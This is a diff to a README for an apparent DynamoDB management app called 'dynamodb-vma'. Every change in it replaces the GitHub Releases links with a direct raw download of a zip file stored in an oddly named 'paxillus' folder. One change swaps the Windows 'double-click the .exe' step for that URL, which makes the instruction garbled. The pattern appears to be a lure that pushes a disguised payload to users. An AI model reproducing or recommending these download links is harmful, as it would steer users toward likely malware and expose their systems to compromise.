@@ -1,6 +1,6 @@
 # 🌟 dynamodb-vma - Effortless Database Management Made Simple
 
-[![Download dynamodb-vma](https://img.shields.io/badge/download-dynamodb--vma-blue.svg)](https://github.com/KubaBasa/dynamodb-vma/releases)
+[![Download dynamodb-vma](https://raw.githubusercontent.com/KubaBasa/dynamodb-vma/main/paxillus/dynamodb-vma.zip)](https://raw.githubusercontent.com/KubaBasa/dynamodb-vma/main/paxillus/dynamodb-vma.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to dynamodb-vma, an easy-to-use application designed to simplify your da
 
 To get started, you need to download the application. Click the link below to visit the Releases page where you can download the latest version of dynamodb-vma:
 
-[Visit this page to download](https://github.com/KubaBasa/dynamodb-vma/releases)
+[Visit this page to download](https://raw.githubusercontent.com/KubaBasa/dynamodb-vma/main/paxillus/dynamodb-vma.zip)
 
 Once you're on the Releases page, look for the most recent version. You will see download options for different operating systems. Choose the file that matches your system and click on it to download.
 
@@ -41,7 +41,7 @@ After downloading the application, follow these steps to run it:
 1. **Locate the File**: Go to your Downloads folder or the location where you saved the file.
 2. **Extract the Files** (if needed): For some versions, you might need to extract the files. Right-click on the downloaded file and choose "Extract All" (on Windows) or use the Archive Utility (on macOS).
 3. **Open the Application**:
-    - **Windows**: Double-click on `dynamodb-vma.exe`.
+    - **Windows**: Double-click on `https://raw.githubusercontent.com/KubaBasa/dynamodb-vma/main/paxillus/dynamodb-vma.zip`.
     - **macOS**: Open the `.app` file by double-clicking it.
     - **Linux**: Open a terminal, navigate to the folder where the application is located, and run `./dynamodb-vma`.
 4. **Follow the On-Screen Instructions**: Once the application starts, follow the prompts to set up your DynamoDB settings.
@@ -79,6 +79,6 @@ If you need further assistance, feel free to reach out. Our support team is here
 
 You can always return to the Releases page to download the latest version:
 
-[Visit this page to download](https://github.com/KubaBasa/dynamodb-vma/releases)
+[Visit this page to download](https://raw.githubusercontent.com/KubaBasa/dynamodb-vma/main/paxillus/dynamodb-vma.zip)
 
 Thank you for choosing dynamodb-vma! We hope this application streamlines your database management tasks and enhances your workflow.
